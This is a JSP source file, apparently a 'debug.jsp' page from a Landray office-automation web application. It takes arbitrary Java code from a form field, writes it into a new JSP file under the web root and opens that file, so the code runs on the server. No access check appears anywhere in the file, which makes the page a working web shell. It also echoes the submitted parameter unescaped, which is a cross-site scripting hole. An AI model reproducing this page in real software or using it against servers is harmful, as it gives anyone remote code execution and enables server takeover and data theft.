<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@page import="java.io.FileOutputStream"%>
<%@page import="com.landray.kmss.sys.config.loader.ConfigLocationsUtil"%>
<%@page import="java.io.BufferedWriter"%>
<%@page import="java.io.OutputStreamWriter"%>
<form action="debug.jsp" method="POST">
	<center>
		<textarea name="fdCode" style="width:95%;height:300px;">${param.fdCode}</textarea><br>
		<input type=submit value="提交">
	</center>
</form>
<%
	String code = request.getParameter("fdCode");
	if(code!=null){
		code = "<"+"%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\""+
			"pageEncoding=\"UTF-8\"%"+"><" + "% " + code + " %" + ">";
		FileOutputStream outputStream = new FileOutputStream(ConfigLocationsUtil.getWebContentPath()+"/sys/common/code.jsp");
		BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
				outputStream, "UTF-8"));
		bw.write(code);
		bw.close();
%>
	<script>
		window.open("<%= request.getContextPath() %>/sys/common/code.jsp", "_blank");
	</script>
<%
	}
%>